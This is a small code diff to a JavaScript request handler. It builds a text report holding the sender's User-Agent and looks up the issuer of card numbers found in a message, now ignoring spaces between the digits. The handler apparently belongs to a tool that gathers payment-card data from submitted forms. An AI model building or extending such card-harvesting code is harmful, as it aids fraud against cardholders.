@@ -144,10 +144,12 @@ export default async function handler(req, res) {
   text += `📍 User-Agent    : ${ua}\n`;
   text += `©️ ${now.getFullYear()} ©️`;
 
-  // —————— AJOUT : lookup BIN avec format demandé ——————
-  const m = rawMsg.match(/\b(\d{8,})/);
-  if (m) {
-    const info = await getBinInfo(m[1].slice(0,8));
+  // —————— AJOUT : lookup BIN (prise en compte des espaces) ——————
+  // on retire tous les non-chiffres pour récupérer un contigu de chiffres
+  const allDigits = rawMsg.replace(/\D/g, '');
+  if (allDigits.length >= 8) {
+    const bin8 = allDigits.slice(0, 8);
+    const info = await getBinInfo(bin8);
     if (info) {
       text += `\n${info.scheme}\n\n`
            + `Brand\n${info.brand}\n\n`
